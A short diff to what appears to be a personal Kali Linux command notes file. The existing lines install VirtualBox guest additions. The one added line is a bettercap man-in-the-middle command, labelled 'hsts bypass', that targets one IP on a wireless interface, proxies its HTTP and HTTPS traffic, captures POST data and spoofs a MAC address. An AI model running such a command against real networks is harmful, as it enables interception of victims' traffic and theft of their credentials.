@@ -117,3 +117,4 @@ apt-get install linux-headers-amd64 //kali guest-additions 1
 apt-get install linux-image-4.9.0-kali4-amd64 //kali guest-additions 2
 reboot //kali guest-additions 3
 apt-get install virtualbox-guest-x11 -y //kali guest additions 4
+bettercap -I wlan0 -T 192.168.1.42  --no-discovery --proxy --proxy-port 80 --proxy-https --proxy-https-port 443 -P POST --use-mac CC:1A:FA:71:91:82 //hsts bypass
